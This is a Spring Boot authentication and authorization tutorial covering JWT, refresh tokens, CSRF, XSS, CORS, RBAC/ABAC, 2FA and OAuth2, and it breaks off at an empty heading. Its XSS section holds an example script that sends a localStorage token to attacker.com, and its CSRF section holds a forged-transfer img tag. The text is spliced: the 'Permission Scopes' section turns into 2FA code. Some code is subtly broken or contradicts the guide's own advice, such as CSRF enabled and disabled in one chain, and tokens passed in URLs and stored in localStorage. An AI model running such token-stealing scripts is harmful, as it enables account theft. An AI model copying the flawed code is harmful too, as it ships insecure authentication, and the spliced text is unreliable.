# Authentication & Authorization Guide for Spring Boot

A complete guide to understanding and implementing auth systems with Spring Boot context.

---

## Phase 1: Foundation Concepts

### 1.1 Authentication vs Authorization

**Authentication (AuthN)** - Who are you?
- User proves their identity using credentials
- Example: Login with username and password
- **Spring Boot**: Use `AuthenticationManager` to verify credentials

**Authorization (AuthZ)** - What can you do?
- System checks if authenticated user has permission
- Example: Can this user delete posts?
- **Spring Boot**: Use `@PreAuthorize`, `@Secured` annotations

**Key Point**: Always authenticate first, then authorize. They are separate steps.

---

### 1.2 Stateful vs Stateless Authentication

#### **Stateful (Session-Based)**
```
Login → Server creates session → SessionID in cookie → 
Client sends cookie → Server checks session → Access granted
```

**How it works:**
- Server stores session data in memory or Redis
- Client gets session ID in cookie
- Each request includes cookie automatically
- Server looks up session to find user info

**Spring Boot Tools:**
- `HttpSession` - Default session management
- `SessionRegistry` - Track active sessions
- Spring Session with Redis for distributed apps

**Pros:**
- Easy to revoke access (delete session)
- Server has full control
- Good for traditional web apps

**Cons:**
- Requires server memory/storage
- Harder to scale horizontally
- Not ideal for mobile apps or SPAs

---

#### **Stateless (Token-Based)**
```
Login → Server creates JWT → Client stores token → 
Client sends token in header → Server validates token → Access granted
```

**How it works:**
- Server generates signed token with user info
- Client stores token (localStorage/cookie)
- Each request includes token in Authorization header
- Server verifies signature without database lookup

**Spring Boot Tools:**
- `io.jsonwebtoken:jjwt` - JWT library
- Custom JWT filter extends `OncePerRequestFilter`
- No built-in session required

**Pros:**
- No server storage needed
- Easy to scale (stateless)
- Perfect for microservices and mobile apps
- Works across different domains

**Cons:**
- Can't instantly revoke tokens (need expiration)
- Token size larger than session ID
- Need refresh token strategy

**When to use what:**
- **Stateful**: Admin panels, traditional web apps, need instant logout
- **Stateless**: APIs, microservices, mobile apps, SPAs, third-party integrations

---

### 1.3 Password Security

#### **Never do this:**
```java
// ❌ WRONG - Plain text
user.setPassword(plainPassword);

// ❌ WRONG - Weak hashing
user.setPassword(md5(plainPassword));
```

#### **Always do this:**
```java
// ✅ CORRECT - BCrypt hashing
String hashedPassword = passwordEncoder.encode(plainPassword);
user.setPassword(hashedPassword);
```

**How password hashing works:**
1. User enters password: `myPassword123`
2. BCrypt adds random salt and hashes: `$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy`
3. Stored in database
4. On login: `passwordEncoder.matches(inputPassword, storedHash)` returns true/false

**Spring Boot Setup:**
```java
@Bean
public PasswordEncoder passwordEncoder() {
    return new BCryptPasswordEncoder(10); // 10 is strength (work factor)
}
```

**Important:**
- Higher BCrypt rounds = more secure but slower (10-12 is good)
- Each password gets unique salt automatically
- Same password creates different hashes each time
- Use Argon2 for even better security (newer standard)

---

## Phase 2: JWT Deep Dive

### 2.1 JWT Structure

A JWT has 3 parts separated by dots: `header.payload.signature`

**Example JWT:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

**Decoded:**

**1. Header** (Algorithm and type)
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**2. Payload** (Claims - your data)
```json
{
  "sub": "1234567890",      // Subject (user ID)
  "name": "John Doe",       // Custom claim
  "email": "john@example.com",
  "roles": ["USER", "ADMIN"],
  "iat": 1516239022,        // Issued at
  "exp": 1516242622         // Expiration
}
```

**3. Signature** (Verification)
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  your-secret-key
)
```

**Spring Boot JWT Generation:**
```java
public String generateToken(UserDetails userDetails) {
    Map<String, Object> claims = new HashMap<>();
    claims.put("roles", userDetails.getAuthorities());
    
    return Jwts.builder()
        .setClaims(claims)
        .setSubject(userDetails.getUsername())
        .setIssuedAt(new Date())
        .setExpiration(new Date(System.currentTimeMillis() + JWT_EXPIRATION))
        .signWith(SignatureAlgorithm.HS256, SECRET_KEY)
        .compact();
}
```

**Important Points:**
- JWT is **signed**, not encrypted (anyone can read payload)
- Don't put passwords or sensitive data in payload
- Signature prevents tampering - if payload changes, signature becomes invalid
- Server verifies signature to trust the token

---

### 2.2 Access Token vs Refresh Token

**Why two tokens?**
- Security: If access token stolen, damage limited by short lifetime
- User Experience: Don't force login every 15 minutes

**Access Token:**
- **Purpose**: Access protected resources
- **Lifetime**: Short (15-60 minutes)
- **Storage**: Memory or localStorage
- **Sent with**: Every API request
- **If compromised**: Limited damage due to short life

**Refresh Token:**
- **Purpose**: Get new access token without login
- **Lifetime**: Long (7-30 days)
- **Storage**: Secure HttpOnly cookie or database
- **Sent with**: Only token refresh requests
- **If compromised**: Can be revoked in database

**Flow:**
```
1. Login → Receive both tokens
   Access: eyJhbGc... (expires in 15 min)
   Refresh: eyJzdWI... (expires in 7 days)

2. API Request → Send access token
   GET /api/posts
   Authorization: Bearer <access-token>

3. Access token expires → Use refresh token
   POST /api/auth/refresh
   Body: { refreshToken: "eyJzdWI..." }
   
4. Get new access token → Continue working
   Response: { accessToken: "eyJnew...", expiresIn: 900 }
```

**Spring Boot Implementation Strategy:**

```java
// Entity for refresh tokens
@Entity
public class RefreshToken {
    @Id
    private Long id;
    
    private String token;
    
    @OneToOne
    private User user;
    
    private Instant expiryDate;
}

// Service methods
public String refreshAccessToken(String refreshToken) {
    RefreshToken token = refreshTokenRepository.findByToken(refreshToken)
        .orElseThrow(() -> new TokenException("Invalid refresh token"));
    
    if (token.getExpiryDate().isBefore(Instant.now())) {
        refreshTokenRepository.delete(token);
        throw new TokenException("Refresh token expired");
    }
    
    return generateAccessToken(token.getUser());
}
```

**Best Practices:**
- Store refresh tokens in database with user reference
- Allow multiple refresh tokens per user (multiple devices)
- Delete refresh token on logout
- Implement token rotation (issue new refresh token on each refresh)

---

### 2.3 Token Storage Options

#### **Option 1: LocalStorage**
```javascript
// Frontend
localStorage.setItem('accessToken', token);
const token = localStorage.getItem('accessToken');
```

**Pros:**
- Easy to implement
- Persists across browser restarts
- Easy to access from JavaScript

**Cons:**
- ⚠️ Vulnerable to XSS attacks
- Any JavaScript can read it (including malicious scripts)

**Use when:** Simple apps, internal tools, low security requirements

---

#### **Option 2: HttpOnly Cookies**
```java
// Spring Boot - Setting cookie
ResponseCookie cookie = ResponseCookie.from("accessToken", token)
    .httpOnly(true)      // JavaScript can't access
    .secure(true)        // Only sent over HTTPS
    .path("/")
    .maxAge(3600)
    .sameSite("Strict")  // CSRF protection
    .build();

response.addHeader("Set-Cookie", cookie.toString());
```

**Pros:**
- 🔒 Protected from XSS (JavaScript can't read)
- Browser automatically sends with requests
- Can set security flags (Secure, SameSite)

**Cons:**
- Requires CSRF protection
- More complex CORS setup
- Doesn't work well with mobile apps

**Use when:** Web applications, high security needs

---

#### **Option 3: Memory Only**
```javascript
// Frontend - Store in React state or variable
const [token, setToken] = useState(null);
```

**Pros:**
- 🔒🔒 Most secure - no storage attack surface
- Impossible to steal via XSS or CSRF

**Cons:**
- Lost on page refresh (need refresh token)
- Requires immediate refresh token flow

**Use when:** Maximum security needed, paired with refresh token in cookie

---

#### **Recommended Approach:**
```
Access Token → Memory (lost on refresh)
Refresh Token → HttpOnly Cookie (persists, secure)

On page load → Use refresh token to get new access token
```

**Spring Boot Filter to read from Cookie:**
```java
@Component
public class JwtAuthenticationFilter extends OncePerRequestFilter {
    
    @Override
    protected void doFilterInternal(HttpServletRequest request, 
                                    HttpServletResponse response, 
                                    FilterChain filterChain) {
        
        // Try to get token from Authorization header
        String token = extractTokenFromHeader(request);
        
        // Fallback to cookie if header not present
        if (token == null) {
            token = extractTokenFromCookie(request);
        }
        
        if (token != null && jwtService.validateToken(token)) {
            String username = jwtService.extractUsername(token);
            UserDetails userDetails = userDetailsService.loadUserByUsername(username);
            
            UsernamePasswordAuthenticationToken authentication = 
                new UsernamePasswordAuthenticationToken(
                    userDetails, null, userDetails.getAuthorities()
                );
            
            SecurityContextHolder.getContext().setAuthentication(authentication);
        }
        
        filterChain.doFilter(request, response);
    }
    
    private String extractTokenFromCookie(HttpServletRequest request) {
        if (request.getCookies() != null) {
            for (Cookie cookie : request.getCookies()) {
                if ("accessToken".equals(cookie.getName())) {
                    return cookie.getValue();
                }
            }
        }
        return null;
    }
}
```

---

## Phase 3: Security Threats & Protection

### 3.1 CSRF (Cross-Site Request Forgery)

**What is CSRF?**

You're logged into `yourbank.com`. A malicious site `evil.com` tricks your browser into making a request to `yourbank.com/transfer?to=hacker&amount=1000`. Since your browser automatically sends cookies, the bank thinks it's you.

**Example Attack:**
```html
<!-- On evil.com -->
<img src="https://yourbank.com/transfer?to=hacker&amount=1000" />
```

Your browser sends this request WITH your authentication cookie automatically.

**When do you need CSRF protection?**
- ✅ When using **cookies** for authentication (browser auto-sends them)
- ❌ NOT needed for **Bearer tokens in headers** (attacker can't access headers)

**Spring Boot CSRF Protection:**

```java
@Configuration
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            // If using cookie-based auth
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
            )
            
            // If using JWT in headers (stateless API)
            .csrf(csrf -> csrf.disable())
            
            .sessionManagement(session -> 
                session.sessionCreationPolicy(SessionCreationPolicy.STATELESS)
            );
        
        return http.build();
    }
}
```

**How CSRF tokens work:**
1. Server generates unique CSRF token for each session/user
2. Token sent to client (in cookie or meta tag)
3. Client includes token in requests (form field or header)
4. Server validates token matches expected value

**Frontend (if CSRF enabled):**
```javascript
// Get CSRF token from cookie
const csrfToken = document.cookie
    .split('; ')
    .find(row => row.startsWith('XSRF-TOKEN='))
    .split('=')[1];

// Send with request
fetch('/api/transfer', {
    method: 'POST',
    headers: {
        'X-XSRF-TOKEN': csrfToken,
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({ amount: 100 })
});
```

**Key Takeaway:** 
- Cookie auth = Enable CSRF protection
- JWT in Authorization header = Disable CSRF (not vulnerable)

---

### 3.2 XSS (Cross-Site Scripting)

**What is XSS?**

Attacker injects malicious JavaScript into your website that runs in other users' browsers.

**Example Attack:**
```javascript
// User posts comment with malicious script
Comment: "Great post! <script>
    fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'))
</script>"

// If you render this without sanitization, script runs
// Steals token from localStorage
```

**Why it matters for auth:**
- Can steal tokens from localStorage/sessionStorage
- Can read page content and send to attacker
- Can make requests on user's behalf
- **HttpOnly cookies are protected** (JavaScript can't access)

**Protection in Spring Boot:**

**1. Content Security Policy (CSP)**
```java
@Configuration
public class SecurityConfig {
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http.headers(headers -> headers
            .contentSecurityPolicy(csp -> 
                csp.policyDirectives("script-src 'self'")
            )
        );
        return http.build();
    }
}
```

**2. Input Validation**
```java
@Service
public class UserService {
    
    public void createPost(PostDTO post) {
        // Validate and sanitize input
        String sanitized = HtmlUtils.htmlEscape(post.getContent());
        
        // Or use validation annotations
        if (!post.getContent().matches("[a-zA-Z0-9\\s.,!?]+")) {
            throw new ValidationException("Invalid content");
        }
    }
}
```

**3. Output Encoding (Thymeleaf does this automatically)**
```html
<!-- Thymeleaf automatically escapes -->
<div th:text="${userComment}"></div>

<!-- Will render as text, not execute -->
Input: <script>alert('xss')</script>
Output: &lt;script&gt;alert('xss')&lt;/script&gt;
```

**Defense Strategy:**
1. Use HttpOnly cookies for tokens (JavaScript can't read)
2. Validate all input (never trust user data)
3. Encode output (escape HTML, JavaScript, URLs)
4. Set Content-Security-Policy header
5. Never use `eval()` or `innerHTML` with user data in frontend

---

### 3.3 CORS (Cross-Origin Resource Sharing)

**What is CORS?**

Browser security feature that blocks requests from different origins. If your frontend is on `localhost:3000` and backend on `localhost:8080`, browser blocks requests by default.

**Origin = Protocol + Domain + Port**
- `http://localhost:3000` ≠ `http://localhost:8080` (different port)
- `https://mysite.com` ≠ `http://mysite.com` (different protocol)

**Spring Boot CORS Configuration:**

**Option 1: Global Configuration**
```java
@Configuration
public class CorsConfig implements WebMvcConfigurer {
    
    @Override
    public void addCorsMappings(CorsRegistry registry) {
        registry.addMapping("/api/**")
            .allowedOrigins("http://localhost:3000", "https://myapp.com")
            .allowedMethods("GET", "POST", "PUT", "DELETE")
            .allowedHeaders("*")
            .allowCredentials(true)  // Allow cookies
            .maxAge(3600);           // Cache preflight for 1 hour
    }
}
```

**Option 2: Controller Level**
```java
@RestController
@RequestMapping("/api")
@CrossOrigin(origins = "http://localhost:3000", allowCredentials = "true")
public class UserController {
    // Your endpoints
}
```

**Option 3: With Spring Security**
```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http.cors(cors -> cors.configurationSource(request -> {
        CorsConfiguration config = new CorsConfiguration();
        config.setAllowedOrigins(List.of("http://localhost:3000"));
        config.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));
        config.setAllowedHeaders(List.of("*"));
        config.setAllowCredentials(true);
        return config;
    }));
    
    return http.build();
}
```

**Important Settings:**

- `allowedOrigins`: Which domains can call your API
  - Development: `http://localhost:3000`
  - Production: Your actual domain
  - ⚠️ Never use `*` with `allowCredentials=true`

- `allowCredentials`: Allow cookies/auth headers
  - `true`: Needed if using cookies or Authorization header
  - Must specify exact origins (can't use `*`)

- `allowedHeaders`: Which request headers allowed
  - Usually `*` or specific list like `["Authorization", "Content-Type"]`

- `allowedMethods`: Which HTTP methods allowed
  - Common: `["GET", "POST", "PUT", "DELETE", "PATCH"]`

**CORS Preflight Request:**

For complex requests (like POST with JSON), browser sends OPTIONS request first:

```
1. Browser: OPTIONS /api/users
   Origin: http://localhost:3000
   
2. Server: 200 OK
   Access-Control-Allow-Origin: http://localhost:3000
   Access-Control-Allow-Methods: POST
   
3. Browser: POST /api/users (actual request)
```

Spring Security filter chain handles this automatically.

---

## Phase 4: Authorization Models

### 4.1 RBAC (Role-Based Access Control)

**Concept:** Users have roles, roles have permissions.

**Example:**
```
User: john@example.com
Roles: [ADMIN, EDITOR]

ADMIN can: everything
EDITOR can: create posts, edit posts, delete own posts
VIEWER can: read posts
```

**Database Schema:**
```sql
-- Users table
users: id, username, password, email

-- Roles table
roles: id, name (ADMIN, EDITOR, VIEWER)

-- User-Role mapping (many-to-many)
user_roles: user_id, role_id

-- Optional: Permissions table for fine-grained control
permissions: id, name (READ_POST, WRITE_POST, DELETE_POST)
role_permissions: role_id, permission_id
```

**Spring Boot Entities:**
```java
@Entity
public class User {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    private String username;
    private String password;
    private String email;
    
    @ManyToMany(fetch = FetchType.EAGER)
    @JoinTable(
        name = "user_roles",
        joinColumns = @JoinColumn(name = "user_id"),
        inverseJoinColumns = @JoinColumn(name = "role_id")
    )
    private Set<Role> roles = new HashSet<>();
}

@Entity
public class Role {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    private String name; // ROLE_ADMIN, ROLE_EDITOR
    
    @ManyToMany(mappedBy = "roles")
    private Set<User> users = new HashSet<>();
}
```

**UserDetailsService Implementation:**
```java
@Service
public class CustomUserDetailsService implements UserDetailsService {
    
    @Autowired
    private UserRepository userRepository;
    
    @Override
    public UserDetails loadUserByUsername(String username) 
            throws UsernameNotFoundException {
        
        User user = userRepository.findByUsername(username)
            .orElseThrow(() -> new UsernameNotFoundException("User not found"));
        
        // Convert roles to Spring Security authorities
        Set<GrantedAuthority> authorities = user.getRoles().stream()
            .map(role -> new SimpleGrantedAuthority(role.getName()))
            .collect(Collectors.toSet());
        
        return new org.springframework.security.core.userdetails.User(
            user.getUsername(),
            user.getPassword(),
            authorities
        );
    }
}
```

**Method-Level Authorization:**

```java
@RestController
@RequestMapping("/api/posts")
public class PostController {
    
    // Only ADMIN can access
    @PreAuthorize("hasRole('ADMIN')")
    @DeleteMapping("/{id}")
    public ResponseEntity<?> deletePost(@PathVariable Long id) {
        postService.delete(id);
        return ResponseEntity.ok().build();
    }
    
    // ADMIN or EDITOR can access
    @PreAuthorize("hasAnyRole('ADMIN', 'EDITOR')")
    @PostMapping
    public ResponseEntity<?> createPost(@RequestBody PostDTO post) {
        return ResponseEntity.ok(postService.create(post));
    }
    
    // Check specific permission
    @PreAuthorize("hasAuthority('WRITE_POST')")
    @PutMapping("/{id}")
    public ResponseEntity<?> updatePost(@PathVariable Long id, @RequestBody PostDTO post) {
        return ResponseEntity.ok(postService.update(id, post));
    }
    
    // Complex expression
    @PreAuthorize("hasRole('ADMIN') or @postSecurity.isOwner(#id, authentication.name)")
    @DeleteMapping("/{id}")
    public ResponseEntity<?> deleteOwnPost(@PathVariable Long id) {
        postService.delete(id);
        return ResponseEntity.ok().build();
    }
}
```

**Enable Method Security:**
```java
@Configuration
@EnableMethodSecurity(prePostEnabled = true)
public class MethodSecurityConfig {
    // Configuration
}
```

**URL-Based Authorization:**
```java
@Bean
public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
    http
        .authorizeHttpRequests(auth -> auth
            .requestMatchers("/api/auth/**").permitAll()
            .requestMatchers("/api/admin/**").hasRole("ADMIN")
            .requestMatchers("/api/posts/**").hasAnyRole("ADMIN", "EDITOR", "VIEWER")
            .anyRequest().authenticated()
        );
    
    return http.build();
}
```

**Custom Security Service for Complex Logic:**
```java
@Service("postSecurity")
public class PostSecurityService {
    
    @Autowired
    private PostRepository postRepository;
    
    public boolean isOwner(Long postId, String username) {
        Post post = postRepository.findById(postId).orElse(null);
        return post != null && post.getAuthor().getUsername().equals(username);
    }
    
    public boolean canEdit(Long postId, String username) {
        Post post = postRepository.findById(postId).orElse(null);
        if (post == null) return false;
        
        // Owner can edit or user with EDIT_ALL_POSTS permission
        return post.getAuthor().getUsername().equals(username);
    }
}
```

---

### 4.2 ABAC (Attribute-Based Access Control)

**Concept:** Access decisions based on attributes of user, resource, and environment.

**Example Rules:**
```
Allow if:
- user.department == resource.department AND
- user.clearanceLevel >= resource.requiredClearance AND
- currentTime is between 9AM-5PM

Deny if:
- resource.isConfidential == true AND
- user.trainingCompleted == false
```

**Use Cases:**
- Healthcare: Doctor can see patient records only in their department
- Finance: Approve transactions up to user's approval limit
- Multi-tenant: Users see only data from their organization

**Spring Boot Implementation:**

```java
// Define attributes
@Entity
public class User {
    private String department;
    private int approvalLimit;
    private Set<String> clearances;
}

@Entity
public class Document {
    private String department;
    private String classification; // PUBLIC, CONFIDENTIAL, SECRET
    private int requiredClearanceLevel;
}

// ABAC Evaluator Service
@Service
public class AbacService {
    
    public boolean canAccess(User user, Document document, String action) {
        
        // Rule 1: Department match
        if (!user.getDepartment().equals(document.getDepartment())) {
            return false;
        }
        
        // Rule 2: Clearance level
        if (user.getClearanceLevel() < document.getRequiredClearanceLevel()) {
            return false;
        }
        
        // Rule 3: Time-based
        LocalTime now = LocalTime.now();
        if (now.isBefore(LocalTime.of(9, 0)) || now.isAfter(LocalTime.of(17, 0))) {
            return false;
        }
        
        // Rule 4: Action-specific
        if ("DELETE".equals(action) && !user.getRoles().contains("ADMIN")) {
            return false;
        }
        
        return true;
    }
}

// Usage in controller
@PreAuthorize("@abacService.canAccess(#user, #document, 'READ')")
@GetMapping("/documents/{id}")
public ResponseEntity<?> getDocument(@PathVariable Long id) {
    // ...
}
```

**When to use ABAC:**
- Complex business rules
- Multi-tenant applications
- Dynamic permissions based on context
- Attribute-rich scenarios

**When to use RBAC:**
- Simple permission model
- Clear user hierarchies
- Static roles
- Easier to understand and maintain

**Hybrid Approach (Common):**
```java
// Combine RBAC and ABAC
@PreAuthorize("hasRole('MANAGER') and @abacService.canApprove(#amount, authentication)")
@PostMapping("/approve")
public ResponseEntity<?> approveExpense(@RequestParam double amount) {
    // RBAC: Must be MANAGER
    // ABAC: Amount must be within user's approval limit
}
```

---

### 4.3 Permission Scopes

**Concept:** Fine-grained permissions instead of broad roles.

**Example:**
```
User token contains scopes:
- read:posts
- write:posts
- delete:own:posts
- read:users
- write:profile
```

**OAuth2 Scopes Pattern:**
```
Scope format: action:resource:qualifier
- read:posts:all
- write:posts:own
- delete:posts:all
```

**Spring Boot Implementation:**

**1. Add dependency:**
```xml
<dependency>
    <groupId>dev.samstevens.totp</groupId>
    <artifactId>totp</artifactId>
    <version>1.7.1</version>
</dependency>
```

**2. User Entity with 2FA:**
```java
@Entity
public class User {
    @Id
    private Long id;
    private String username;
    private String password;
    
    // 2FA fields
    private boolean mfaEnabled = false;
    private String mfaSecret; // Stored encrypted in production
}
```

**3. 2FA Service:**
```java
@Service
public class TwoFactorAuthService {
    
    private final TimeProvider timeProvider = new SystemTimeProvider();
    private final CodeGenerator codeGenerator = new DefaultCodeGenerator();
    private final CodeVerifier verifier = new DefaultCodeVerifier(codeGenerator, timeProvider);
    
    // Generate secret for new 2FA setup
    public String generateSecret() {
        SecretGenerator secretGenerator = new DefaultSecretGenerator();
        return secretGenerator.generate();
    }
    
    // Generate QR code URI for authenticator app
    public String getQRCodeUri(String secret, String username) {
        return "otpauth://totp/" + username + "?secret=" + secret + "&issuer=MyApp";
    }
    
    // Verify the 6-digit code from user
    public boolean verifyCode(String secret, String code) {
        return verifier.isValidCode(secret, code);
    }
}
```

**4. Enable 2FA Flow:**
```java
@RestController
@RequestMapping("/api/auth/2fa")
public class TwoFactorAuthController {
    
    @Autowired
    private TwoFactorAuthService tfaService;
    
    @Autowired
    private UserRepository userRepository;
    
    // Step 1: User requests to enable 2FA
    @PostMapping("/setup")
    public ResponseEntity<?> setupTwoFactor(Authentication auth) {
        User user = getCurrentUser(auth);
        
        // Generate secret
        String secret = tfaService.generateSecret();
        user.setMfaSecret(secret);
        user.setMfaEnabled(false); // Not enabled until verified
        userRepository.save(user);
        
        // Return QR code URI
        String qrUri = tfaService.getQRCodeUri(secret, user.getUsername());
        
        return ResponseEntity.ok(Map.of(
            "secret", secret,
            "qrCodeUri", qrUri
        ));
    }
    
    // Step 2: User scans QR and enters first code to confirm
    @PostMapping("/verify-setup")
    public ResponseEntity<?> verifySetup(@RequestBody Map<String, String> request, 
                                         Authentication auth) {
        User user = getCurrentUser(auth);
        String code = request.get("code");
        
        if (tfaService.verifyCode(user.getMfaSecret(), code)) {
            user.setMfaEnabled(true);
            userRepository.save(user);
            return ResponseEntity.ok(Map.of("message", "2FA enabled successfully"));
        }
        
        return ResponseEntity.badRequest().body(Map.of("error", "Invalid code"));
    }
    
    // Disable 2FA
    @PostMapping("/disable")
    public ResponseEntity<?> disableTwoFactor(@RequestBody Map<String, String> request,
                                               Authentication auth) {
        User user = getCurrentUser(auth);
        String code = request.get("code");
        
        if (tfaService.verifyCode(user.getMfaSecret(), code)) {
            user.setMfaEnabled(false);
            user.setMfaSecret(null);
            userRepository.save(user);
            return ResponseEntity.ok(Map.of("message", "2FA disabled"));
        }
        
        return ResponseEntity.badRequest().body(Map.of("error", "Invalid code"));
    }
}
```

**5. Modified Login Flow:**
```java
@PostMapping("/login")
public ResponseEntity<?> login(@RequestBody LoginRequest request) {
    
    // Step 1: Verify username and password
    Authentication authentication = authenticationManager.authenticate(
        new UsernamePasswordAuthenticationToken(
            request.getUsername(),
            request.getPassword()
        )
    );
    
    User user = userRepository.findByUsername(request.getUsername()).orElseThrow();
    
    // Step 2: Check if 2FA is enabled
    if (user.isMfaEnabled()) {
        // Don't give full access token yet
        // Return temporary token that only allows 2FA verification
        String tempToken = generateTempToken(user);
        
        return ResponseEntity.ok(Map.of(
            "requires2FA", true,
            "tempToken", tempToken
        ));
    }
    
    // No 2FA - return normal tokens
    String accessToken = jwtService.generateToken(user);
    String refreshToken = refreshTokenService.createRefreshToken(user);
    
    return ResponseEntity.ok(new AuthResponse(accessToken, refreshToken));
}

@PostMapping("/verify-2fa")
public ResponseEntity<?> verifyTwoFactor(@RequestBody TwoFactorRequest request) {
    
    // Validate temp token
    String username = jwtService.extractUsername(request.getTempToken());
    User user = userRepository.findByUsername(username).orElseThrow();
    
    // Verify 2FA code
    if (!tfaService.verifyCode(user.getMfaSecret(), request.getCode())) {
        return ResponseEntity.badRequest().body(Map.of("error", "Invalid 2FA code"));
    }
    
    // Code is valid - return full access tokens
    String accessToken = jwtService.generateToken(user);
    String refreshToken = refreshTokenService.createRefreshToken(user);
    
    return ResponseEntity.ok(new AuthResponse(accessToken, refreshToken));
}
```

**Frontend Flow:**
```javascript
// Step 1: Regular login
const response = await fetch('/api/auth/login', {
    method: 'POST',
    body: JSON.stringify({ username, password })
});

const data = await response.json();

if (data.requires2FA) {
    // Step 2: Show 2FA input screen
    const code = prompt('Enter 6-digit code from authenticator app');
    
    // Step 3: Verify 2FA
    const verifyResponse = await fetch('/api/auth/verify-2fa', {
        method: 'POST',
        body: JSON.stringify({ 
            tempToken: data.tempToken, 
            code: code 
        })
    });
    
    const tokens = await verifyResponse.json();
    // Store tokens and proceed
} else {
    // No 2FA - proceed with tokens
}
```

**Important Points:**
- Store mfaSecret encrypted in production
- Use time window (usually 30 seconds) for code validity
- Allow backup codes for account recovery
- Rate limit 2FA verification attempts
- Temporary token should be short-lived (5 minutes)

---

### 5.2 OAuth2 Framework

**What is OAuth2?**
Authorization framework that allows third-party apps to access user resources without sharing passwords.

**Example:** "Sign in with Google" - Your app gets access to user's Google profile without knowing their Google password.

**Key Roles:**
1. **Resource Owner**: User who owns the data
2. **Client**: Your application requesting access
3. **Resource Server**: Server hosting protected resources (e.g., Google's API)
4. **Authorization Server**: Server issuing tokens (e.g., Google's OAuth server)

**OAuth2 Flows:**

#### **Authorization Code Flow** (Most Secure - for Web Apps)

```
1. User clicks "Login with Google"
   
2. Redirect to Google:
   GET https://accounts.google.com/o/oauth2/v2/auth?
       client_id=YOUR_CLIENT_ID
       &redirect_uri=http://localhost:8080/callback
       &response_type=code
       &scope=email profile

3. User logs in to Google and approves
   
4. Google redirects back with CODE:
   GET http://localhost:8080/callback?code=AUTH_CODE

5. Exchange CODE for tokens:
   POST https://oauth2.googleapis.com/token
   Body: {
       code: AUTH_CODE,
       client_id: YOUR_CLIENT_ID,
       client_secret: YOUR_SECRET,
       redirect_uri: http://localhost:8080/callback,
       grant_type: authorization_code
   }

6. Get back ACCESS_TOKEN and REFRESH_TOKEN

7. Use access token to get user info:
   GET https://www.googleapis.com/oauth2/v2/userinfo
   Authorization: Bearer ACCESS_TOKEN
```

**Spring Boot Implementation:**

**1. Add Spring Security OAuth2 Client:**
```xml
<dependency>
    <groupId>org.springframework.boot</groupId>
    <artifactId>spring-boot-starter-oauth2-client</artifactId>
</dependency>
```

**2. Configuration (application.yml):**
```yaml
spring:
  security:
    oauth2:
      client:
        registration:
          google:
            client-id: YOUR_GOOGLE_CLIENT_ID
            client-secret: YOUR_GOOGLE_CLIENT_SECRET
            scope:
              - email
              - profile
          github:
            client-id: YOUR_GITHUB_CLIENT_ID
            client-secret: YOUR_GITHUB_CLIENT_SECRET
            scope:
              - user:email
              - read:user
```

**3. Security Configuration:**
```java
@Configuration
@EnableWebSecurity
public class OAuth2SecurityConfig {
    
    @Autowired
    private OAuth2SuccessHandler successHandler;
    
    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        http
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/", "/login", "/error").permitAll()
                .anyRequest().authenticated()
            )
            .oauth2Login(oauth2 -> oauth2
                .successHandler(successHandler)
            );
        
        return http.build();
    }
}
```

**4. Custom Success Handler:**
```java
@Component
public class OAuth2SuccessHandler extends SimpleUrlAuthenticationSuccessHandler {
    
    @Autowired
    private UserRepository userRepository;
    
    @Autowired
    private JwtService jwtService;
    
    @Override
    public void onAuthenticationSuccess(HttpServletRequest request,
                                        HttpServletResponse response,
                                        Authentication authentication) throws IOException {
        
        OAuth2User oAuth2User = (OAuth2User) authentication.getPrincipal();
        
        // Extract user info from OAuth2 provider
        String email = oAuth2User.getAttribute("email");
        String name = oAuth2User.getAttribute("name");
        String providerId = oAuth2User.getAttribute("sub"); // Google user ID
        
        // Find or create user in your database
        User user = userRepository.findByEmail(email)
            .orElseGet(() -> createNewUser(email, name, providerId, "GOOGLE"));
        
        // Generate your own JWT tokens
        String accessToken = jwtService.generateToken(user);
        String refreshToken = refreshTokenService.createRefreshToken(user);
        
        // Redirect to frontend with tokens
        String redirectUrl = String.format(
            "http://localhost:3000/oauth/callback?access_token=%s&refresh_token=%s",
            accessToken, refreshToken
        );
        
        getRedirectStrategy().sendRedirect(request, response, redirectUrl);
    }
    
    private User createNewUser(String email, String name, String providerId, String provider) {
        User user = new User();
        user.setEmail(email);
        user.setUsername(email);
        user.setName(name);
        user.setOauthProvider(provider);
        user.setOauthProviderId(providerId);
        user.setRoles(Set.of(new Role("ROLE_USER")));
        return userRepository.save(user);
    }
}
```

**5. Entity with OAuth Support:**
```java
@Entity
public class User {
    @Id
    private Long id;
    
    private String username;
    private String email;
    
    @Column(nullable = true)
    private String password; // Null for OAuth users
    
    private String oauthProvider; // GOOGLE, GITHUB, FACEBOOK
    private String oauthProviderId; // Provider's user ID
    
    @ManyToMany
    private Set<Role> roles;
}
```

**Frontend Integration:**
```javascript
// User clicks "Login with Google"
window.location.href = 'http://localhost:8080/oauth2/authorization/google';

// After OAuth flow, user redirected to:
// http://localhost:3000/oauth/callback?access_token=...&refresh_token=...

// Extract tokens from URL
const urlParams = new URLSearchParams(window.location.search);
const accessToken = urlParams.get('access_token');
const refreshToken = urlParams.get('refresh_token');

// Store tokens
localStorage.setItem('accessToken', accessToken);
localStorage.setItem('refreshToken', refreshToken);

// Redirect to dashboard
window.location.href = '/dashboard';
```

---

#### **Client Credentials Flow** (Machine-to-Machine)

